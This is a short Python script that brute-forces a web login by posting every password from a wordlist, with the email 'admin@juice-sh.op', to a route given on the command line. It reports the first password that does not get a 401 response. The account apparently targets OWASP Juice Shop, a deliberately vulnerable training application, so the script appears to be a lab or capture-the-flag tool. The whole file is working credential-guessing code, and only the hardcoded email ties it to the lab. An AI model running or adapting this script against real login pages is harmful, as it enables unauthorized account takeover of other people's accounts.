import requests
import sys


def init():
    
    if len(sys.argv) >= 3:
        print('\n\033[33m[ Trying to Crack the Password... ]\033[0;0;0m\n')
        
        post = sys.argv[1].strip()
        wordlist = sys.argv[2].strip()
        
        passwords = open_wordlist(wordlist)
        brute(post, passwords)

    else:
        print('\n\033[32mUsage:\033[0;0;0m py post_brute.py \033[31m< \033[33mpost_route\033[0;0;0m \033[31m> <\033[0;0;0m \033[33mwordlist.txt\033[0;0;0m \033[31m>\033[0;0;0m\n')
        exit()

    print('\033[33m[i] No Password found in Wordlist!\033[0;0;0m\n')


def open_wordlist(wordlist):
    with open(wordlist, "r") as file:
        passwords = file.readlines()
        return passwords


def brute(post_route, list_passwords):
    try:
        for password in list_passwords:
            password = password.strip()
            data = {"email": "admin@juice-sh.op", "password": password}
            response = requests.post(post_route, json=data)
            code = response.status_code
            
            if code != 401:
                print(f'\033[36m[*] {password}\033[0;0;0m\n')
                exit()

    except KeyboardInterrupt: print('\n\033[31m< Operation Canceled by User >\033[0;0;0m\n'); exit()

    except Exception as error: print(f'FATAL ERROR: {error}')


if __name__ == "__main__":
    init()
